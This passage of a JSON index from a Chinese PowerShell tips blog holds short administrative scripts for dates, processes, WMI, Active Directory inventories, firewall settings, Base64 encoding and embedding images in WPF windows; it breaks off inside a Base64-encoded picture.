UserPath","link":"/2015/11/12/finding-script-block-variables/"},{"title":"PowerShell 技能连载 - 根据参数值执行不同的代码","text":"以下是一个使用一系列选项的操作参数的简单概念。每个选项对应一个将被执行的脚本块。 #requires -Version 2 function Invoke-SomeAction { param ( [String] [Parameter(Mandatory=$true)] [ValidateSet('Deploy','Delete','Refresh')] $Action ) $codeAction = @{} $codeAction.Deploy = { 'Doing the Deployment' } $codeAction.Delete = { 'Doing the Deletion' } $codeAction.Refresh = { 'Doing the Refresh' } &amp; $codeAction.$Action } 当运行这段代码后，键入 Invoke-SomeAction，ISE 将会提供它所支持的“Deployment”、“Deletion”和“Refresh”操作。相对简单的 PowerShell 控制台至少会提供 action 参数的 tab 补全功能。 根据您的选择，PowerShell 将会执行合适的脚本块。如您所见，该操作脚本块可以包括任意代码，甚至多页代码。","link":"/2015/11/13/invoking-different-code-based-on-parameter-value/"},{"title":"PowerShell 技能连载 - 等待进程启动","text":"PowerShell 内置了等待一个进程或多个进程结束的功能：只需要用 Wait-Process 命令。 但是并不支持相反的功能：等待一个进程启动。以下是一个等待任意进程的函数： #requires -Version 1 function Wait-ForProcess { param ( $Name = 'notepad', [Switch] $IgnoreAlreadyRunningProcesses ) if ($IgnoreAlreadyRunningProcesses) { $NumberOfProcesses = (Get-Process -Name $Name -ErrorAction SilentlyContinue).Count } else { $NumberOfProcesses = 0 } Write-Host &quot;Waiting for $Name&quot; -NoNewline while ( (Get-Process -Name $Name -ErrorAction SilentlyContinue).Count -eq $NumberOfProcesses ) { Write-Host '.' -NoNewline Start-Sleep -Milliseconds 400 } Write-Host '' } 当您运行这段代码时，PowerShell 将会暂停直到您运行一个 Notepad 的新实例： Wait-ForProcess -Name notepad -IgnoreAlreadyRunningProcesses 当您忽略了 -IgnoreAlreadyRunningProcesses 参数时，如果已有至少一个 Notepad 的实例在运行，PowerShell 将会立即继续。","link":"/2015/11/16/waiting-for-process-launch/"},{"title":"PowerShell 技能连载 - 转换日期、时间格式","text":"以下是一个简单的 PowerShell 过滤器，它能够将任意的 DateTime 对象转换为您所需要的日期/时间格式： #requires -Version 1 filter Convert-DateTimeFormat { param($OutputFormat='yyyy-MM-dd HH:mm:ss fff') try { ([DateTime]$_).ToString($OutputFormat) } catch {} } 以下是如何运行它的一些例子： PS&gt; Get-Date | Convert-DateTimeFormat 2015-10-23 14:38:37 140 PS&gt; Get-Date | Convert-DateTimeFormat -OutputFormat 'dddd' Friday PS&gt; Get-Date | Convert-DateTimeFormat -OutputFormat 'MM&quot;/&quot;dd&quot;/&quot;yyyy' 10/23/2015 PS&gt; '2015-12-24' | Convert-DateTimeFormat -OutputFormat 'dddd' Thursday 如您所见，您可以将 DateTime 类型数据，或是能够转换为 DateTime 类型的数据通过管道传给 Convert-DateTimeFormat。默认情况下，该函数以 ISO 格式格式化，但是您还可以通过 -OutputFormat 指定您自己的格式。 通过源码，您可以查看到类似日期和时间部分的字母。请注意这些字母是大小写敏感的（“m”代表分钟，而“M”代表月份）。并且您指定了越多的字母，就能显示越多的细节。 所有希望原样显示的文字必须用双引号括起来。","link":"/2015/11/17/converting-date-time-formats/"},{"title":"PowerShell 技能连载 - 以不同的格式输出文件大小","text":"当您将一个数值赋给一个变量时，您也许希望按不同的单位显示该数字。字节的方式很清晰，但是有些时候以 KB 或 MB 的方式显示更合适。 以下是一个聪明的技巧，它用一个更多样化的版本覆盖了内置的 ToString() 方法。该方法包括了单位，您希望的位数，以及后缀文字。通过这种方式，您可以根据需要按各种格式显示数字。 变量的内容并没有被改变，所以变量仍然存储着 Integer 数值。您可以安全地用于排序及和其它值比较： #requires -Version 1 $a = 1257657656 $a = $a | Add-Member -MemberType ScriptMethod -Name tostring -Force -Value { param($Unit = 1MB, $Digits=1, $Suffix=' MB') &quot;{0:n$Digits}$Suffix&quot; -f ($this/($Unit)) } -PassThru 以下是多种使用 $a 的例子： PS&gt; $a 1.199,4 MB PS&gt; $a.ToString(1GB, 0, ' GB') 1 GB PS&gt; $a.ToString(1KB, 2, ' KB') 1.228.181,30 KB PS&gt; $a -eq 1257657656 True PS&gt; $a -eq 1257657657 False PS&gt; $a.GetType().Name Int32","link":"/2015/11/18/outputting-file-sizes-in-different-formats/"},{"title":"PowerShell 技能连载 - 使用网格窗口作为一个通用的对话框","text":"Out-GridView 不止可以用于显示结果。您可以将它转换为一个很有用的通用对话框。 假设您希望显示一系列运行中的程序，然后结束掉选中的程序。传统的方式大概是这样： Get-Process | Where-Object { $_.MainWindowTitle } | Out-GridView -OutputMode Single | Stop-Process -WhatIf 当您将源对象通过管道传给 Out-GridView 命令时，用户将能看到所有的普通对象属性。这也许没问题，但如果您希望用户体验更好一些，您可以使用一些更高级的 PowerShell 技巧： #requires -Version 3 $prompt = 'Choose the process you want to terminate:' Get-Process | Where-Object { $_.MainWindowTitle } | ForEach-Object { New-Object PSObject -Property @{$prompt = $_ | Add-Member -MemberType ScriptMethod -Name ToString -Force -Value { '{0} [{1}]' -f $this.Description, $this.Id } -PassThru } } | Out-GridView -OutputMode Single -Title $prompt | Select-Object -ExpandProperty $prompt | Stop-Process -WhatIf 请先看用户体验：该网格窗口不再让人感到疑惑。现在让我们检查一下如何实现这种用户体验。 在结果通过管道传给 Out-GridView 之前，它们被重新打包成一个只有单个属性的对象。该属性包含了您在 $prompt 中定义的名称，所以它基本上就是您想呈现给用户的信息。 当您做完这些并将包裹后的对象通过管道传给 Out-GridView 后，您可以看到该对象的文字呈现。要控制文字呈现的方式，我们将它的 ToString() 方法用一个显示您期望的值的方法来覆盖。在这个例子里，它显示进程的描述和进程的 ID。 最后，被用户选中的对象将再被拆包。通过这种方法，您可以获取源对象。","link":"/2015/11/19/use-a-grid-view-window-as-a-universal-dialog/"},{"title":"PowerShell 技能连载 - 从 WMI 中搜索有用的信息","text":"WMI 是一个很好的信息源，但要找到正确的 WMI 类来查询并不总是那么容易。 一下是一个小小的搜索工具：它提示输入一个关键字，然后根据在 WMI 中搜索所有合适的关键字。结果将显示在一个网格视图窗口中，然后您可以选择一个类并按下“确定”按钮，该工具将查询出匹配的结果： #requires -Version 3 function Search-WMI { param([Parameter(Mandatory=$true)]$Keyword) Get-WmiObject -Class &quot;Win32_*$Keyword*&quot; -List | Where-Object { $_.Properties.Count -gt 6 } | Where-Object { $_.Name -notlike 'Win32_Perf*' } | Sort-Object -Property Name | Select-Object -Property @{Name='Select one of these classes'; Expression={$_.Name }} | Out-GridView -Title 'Choose one' -OutputMode Single | ForEach-Object { Get-WmiObject -Class $_.'Select one of these classes' | Out-GridView } } Search-WMI -Keyword network","link":"/2015/11/20/search-wmi-for-useful-information/"},{"title":"PowerShell 技能连载 - 将结果通过管道直接传给 Office Word","text":"只需要几行代码，您就可以实现一个 Out-OfficeWord 指令。它接受传入的数据并将它们插入一个新的 Word 文档中（假设 Word 已经安装）。 #requires -Version 1 function Out-OfficeWord { param ( $Font = 'Courier', $FontSize = 12, $Width = 80, [switch] $Landscape ) $Text = $Input | Out-String -Width $Width $WordObj = New-Object -ComObject Word.Application $document = $WordObj.Documents.Add() $document.PageSetup.Orientation = [Int][bool]$Landscape $document.Content.Text = $Text $document.Content.Font.Size = $FontSize $document.Content.Font.Name = $Font $document.Paragraphs | ForEach-Object { $_.SpaceAfter = 0 } $WordObj.Visible = $true } 要在 Word 中建立一个正在运行中的进程列表，只需要运行这段代码： Get-Process | Out-OfficeWord -Landscape -Font Consolas -FontSize 8 接下来，您可以将结果另存为 PDF、改进格式，或打印出来。","link":"/2015/11/23/piping-results-straight-into-office-word/"},{"title":"PowerShell 技能连载 - 为大量文件建立拷贝备份","text":"PowerShell 可以为您的文件建立备份。您所需要调整的只是需要备份的文件类型，以及您需要备份的目标文件扩展名。 这个例子将影响（直接）存储在您的用户目录下的 PowerShell 脚本。也许这个文件夹下并没有这类文件，所以要么拷入一个文件来测试这个脚本，要么指定一个不同的文件夹路径。 每个脚本将被备份到相同的主文件名，而扩展名为“.ps1_old”的文件中。 当您改变 $Recurese 的值时，脚本将会为您的用户文件夹下的所有 PowerShell 创建备份。 #requires -Version 1 $ExtensionToBackup = '.ps1' $BackupExtension = '.ps1_old' $FolderToProcess = $HOME $Recurse = $false Get-ChildItem -Path $FolderToProcess -Filter $ExtensionToBackup -Recurse:$Recurse | ForEach-Object { $newpath = [System.IO.Path]::ChangeExtension($_.FullName, $BackupExtension) Copy-Item -Path $_.FullName -Destination $newpath }","link":"/2015/11/24/creating-backup-copies-of-many-files/"},{"title":"PowerShell 技能连载 - 理解 -f 操作符","text":"您也许已经遇到过 -f 操作符并且很好奇它做了什么。它是一个格式化操作符并且提供了一种相当简单的方法来操作数组元素并创建字符串。 让我们从一个值数组开始，比如这个： $info = 'PowerShell', $PSVersionTable.PSVersion.Major, $pshome 您可以通过序号访问单个数组元素。 PS&gt; $info[0] PowerShell PS&gt; $info[1] 4 PS&gt; $info[2] C:\\Windows\\System32\\WindowsPowerShell\\v1.0 如果您需要将该数组的元素合并为一个字符串，这时候 -f 操作符就能够大显身手了。它能够使用相同的序号来读取数组元素并将它们组成一个字符串。以下是一些例子，它们使用 $info 中的信息来组成不同的字符串： PS&gt; '{0} Version is {1}. Location &quot;{2}' -f $info PowerShell Version is 4. Location &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0 PS&gt; '{0} {1}' -f $info PowerShell 4 PS&gt; '{0} {1:0.0}' -f $info PowerShell 4.0 PS&gt; '{0}: {2}' -f $info PowerShell: C:\\Windows\\System32\\WindowsPowerShell\\v1.0","link":"/2015/11/25/understanding-the-f-operator/"},{"title":"PowerShell 技能连载 - 根据 OU 分析操作系统","text":"以下是一个快捷的脚本，扫描 Active Directory 中的所有 OU，得到所有的计算机账户，然后将每个 OU 的信息按照操作系统分组： #requires -Version 2 -Modules ActiveDirectory Get-ADOrganizationalUnit -Filter * | ForEach-Object { $OU = $_ Get-ADComputer -Filter * -SearchBase $OU.DistinguishedName -SearchScope SubTree -Properties Enabled, OperatingSystem | Where-Object { $_.Enabled -eq $true } | Group-Object -Property OperatingSystem -NoElement | Select-Object -Property Count, Name, OU, OUDN | ForEach-Object { $_.OU = $OU.Name $_.OUDN = $OU.DistinguishedName $_ } } | Out-GridView","link":"/2015/12/22/analyze-operating-system-by-organizational-unit/"},{"title":"PowerShell 技能连载 - 获取操作系统清单","text":"如果您的老板需要一份您 AD 中所有计算机的操作系统清单，这也许是个好办法： #requires -Version 1 -Modules ActiveDirectory $max = 100 $os = Get-ADComputer -Filter * -Properties OperatingSystem -ResultPageSize $max | Group-Object -Property OperatingSystem -NoElement | Select-object -ExpandProperty Name | ForEach-Object { '&quot;{0}&quot;' -f $_ } $list = $os -join ',' $list # copy list to clipboard $list | clip 该脚本将从您的 AD 中获取计算机账户并将它们根据操作系统分组，然后将它整理成一个清单。请注意使用 PageSize 因为在一个大型的组织中获取所有计算机信息可能会花费很长时间。","link":"/2015/12/23/get-list-of-operating-systems/"},{"title":"PowerShell 技能连载 - 查询当前登录的用户名","text":"有两种方式可以查询当前登录的用户： # User logged on to a physical box Get-WmiObject -Class Win32_ComputerSystem | Select-object -ExpandProperty UserName # Owners of explorer.exe processes (desktop is an Explorer process) Get-WmiObject -Class Win32_Process -Filter 'Name=&quot;explorer.exe&quot;' | ForEach-Object { $owner = $_.GetOwner() '{0}\\{1}' -f $owner.Domain, $owner.User } | Sort-Object -Unique 两种使用 Get-WmiObject 的方式都支持本地和远程方式调用。","link":"/2015/12/24/findinglogged-on-user/"},{"title":"PowerShell 技能连载 - 自动获取重要的支持响应信息","text":"Here is a fun function to provide you with a good first level support response in case everyone is off for Christmas:这是一个有趣的函数，当所有人都下班去过圣诞时将给您提供重要的支持响应信息。 #requires -Version 3 function Get-FirstLevelSupportResponse { $url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl' $ProgressPreference = 'SilentlyContinue' $page = Invoke-WebRequest -Uri $url -UseBasicParsing $pattern = '(?s)&lt;br&gt;&lt;font size\\s?=\\s?&quot;\\+2&quot;&gt;(.+)&lt;/font' if ($page.Content -match $pattern) { $matches[1] } } 您需要 Internet 连接来运行这段脚本。","link":"/2015/12/25/get-automated-first-level-support-response/"},{"title":"PowerShell 技能连载 - 强制用户修改密码","text":"使用这段代码片段可以强制用户改变他/她的密码： #requires -Version 1 -Modules ActiveDirectory Set-ADUser -Identity username -ChangePasswordAtNextLogon $true","link":"/2015/12/28/force-user-to-change-password/"},{"title":"PowerShell 技能连载 - 清除回收站","text":"在 PowerShell 5.0 之前，要清除回收站得手工删除每个驱动器根目录下隐藏的 $Recycle.Bin 文件夹里的内容。 有一些作者推荐使用名为 Shell.Application 的 COM 对象。它不一定可靠，因为回收站不一定可见，取决于资源管理器的设置。 幸运的事，PowerShell 5.0 终于提供了 Clear-RecycleBin Cmdlet。","link":"/2015/12/29/clearing-recycle-bin/"},{"title":"PowerShell 技能连载 - 查找递归的 AD 成员","text":"在 AD 中，有一个看起来很奇怪的过滤器：1.2.840.113556.1.4.1941。它被称为“链式匹配规则”，可以用来快速查找嵌套的成员。 您所需的是某个成员的 DN。然后，您可以像这样使用它： 1234#requires -Version 1 -Modules ActiveDirectory$DN = 'place DN here!'Get-ADGroup -LDAPFilter &quot;(member:1.2.840.113556.1.4.1941:=$($DN))&quot; Since this is a native LDAP filter, you can even use it without the ActiveDirectory module, resorting to native .NET methods:由于它是一个原生的 LDAP 过滤器，您甚至可以在没有 ActiveDirectory 模块的情况下以 .NET 原生的方式使用它。 123456789101112131415161718$DN = 'place DN here!'$strFilter = &quot;(member:1.2.840.113556.1.4.1941:=$DN)&quot;$objDomain = New-Object System.DirectoryServices.DirectoryEntry('LDAP://rootDSE')$objSearcher = New-Object System.DirectoryServices.DirectorySearcher$objSearcher.SearchRoot = &quot;LDAP://$($objDomain.rootDomainNamingContext)&quot;$objSearcher.PageSize = 1000$objSearcher.Filter = $strFilter$objSearcher.SearchScope = 'Subtree'$colProplist = 'name'foreach ($i in $colPropList){ $null = $objSearcher.PropertiesToLoad.Add($i)}$colResults = $objSearcher.FindAll()foreach ($objResult in $colResults){ $objItem = $objResult.Properties $objItem.name}","link":"/2015/12/30/finding-recursive-ad-memberships/"},{"title":"PowerShell 技能连载 - 管理 Windows 防火墙","text":"从 Windows 8 和 Server 2012 开始，有一个 Cmdlet 可以在多个配置中启用客户端防火墙： 1Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True 在之前的操作系统中，您需要使用依靠 netsh.exe： 1netsh advfirewall set allprofiles state on","link":"/2015/12/31/managing-windows-firewall/"},{"title":"PowerShell 技能连载 - 用 Base64 编解码文本","text":"以下是将文本用 Base64 编码的简单方法： 1234#requires -Version 1$text = 'Hello World!'[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text), 'InsertLineBreaks') 结果字符串看起来大概如下： SABlAGwAbABvACAAVwBvAHIAbABkACEA 文本编码可以用于简易的混淆文本，或是保护文本防止不小心被错误地格式化。例如 PowerShell.exe 可运行 Base64 编码过的命令。以下是一个例子（请打开您机器的声音）： 1powershell.exe -EncodedCommand ZgBvAHIAKAAkAHgAIAA9ACAAMQAwADAAMAA7ACAAJAB4ACAALQBsAHQAIAAxADIAMAAwADAAOwAgACQAeAArAD0AMQAwADAAMAApACAAewAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgBzAG8AbABlAF0AOgA6AEIAZQBlAHAAKAAkAHgALAAgADMAMAAwACkAOwAgACIAJAB4ACAASAB6ACIAfQA= 要解码一个 Base64 字符串，您可以使用以下代码。 1234#requires -Version 1$text = 'SABlAGwAbABvACAAVwBvAHIAbABkACEA'[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($text)) 您也可以使用这段代码来解码上面那段编码后的命令，看看它做了什么。只需要用编码过的命令替换掉 $test。","link":"/2016/01/01/encode-and-decode-text-as-base64/"},{"title":"PowerShell 技能连载 - 对图片编码","text":"如果您的脚本需要图标或图片等资源，您不需要另外发布这些资源。它们可以用 Base64 编码并且以纯文本的方式加到您的脚本中。 这个例子演示了如何将一个 JPG 图片转换为 Base64 编码的字符串： 12345678910111213141516171819202122232425function Convert-JPG2Base64 { param ( [Parameter(Mandatory=$true)] [String] $Path ) $format = [System.Drawing.Imaging.ImageFormat]::Jpeg $image = [System.Drawing.Image]::FromFile($Path) $stream = New-Object -TypeName System.IO.MemoryStream $image.Save($stream, $format) $bytes = [Byte[]]($stream.ToArray()) [System.Convert]::ToBase64String($bytes, 'InsertLineBreaks')}# find a random picture$picture = Get-ChildItem $env:windir\\Web\\Wallpaper *.jpg -Recurse | Select-Object -First 1$pictureString = Convert-JPG2Base64 -Path $picture.FullName$pictureString Convert-JPG2Base64 函数接受一个 JPG 图片路径作为参数并且返回 Base64 编码后的图片。在这个例子中，我们使用 Windows 文件夹中的第一个 JPG 墙纸。请确保您的 Windows 文件夹中包含图片，或者把 JPG 图片的文件夹改为您想要的文件夹。 返回的文本可以嵌入一段脚本中。而且，返回的 Base64 文本可能会非常大，由图片的尺寸和质量决定。 明天，我们将演示如何将 Base64 编码后的图片加载到内存中，并在自己的 WPF 窗口中显示。","link":"/2016/01/04/encoding-pictures/"},{"title":"PowerShell 技能连载 - 用 WPF 窗口加载 Base64 编码的图片","text":"在前一个技能中我们演示了如何将任何图片转换为 Base64 编码的字符串。今天，我们将演示如何加载 Base64 编码的图片并显示它。 这个窗口显示官方会议 logo 并且不需要独立的图片文件。该图像已经嵌入到脚本中并且直接从内存中加载。 在脚本头部的嵌入图片十分大。最重要的部分是在 Base64 编码字符串之后的 Convert-Base64Bitmap2Picture 函数。它接受 Base64 编码的文本并且返回一个 bitmap 对象。这个对象可以设为任何 WPF image 控件的源。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281Add-Type -AssemblyName PresentationFramework$picture1 ='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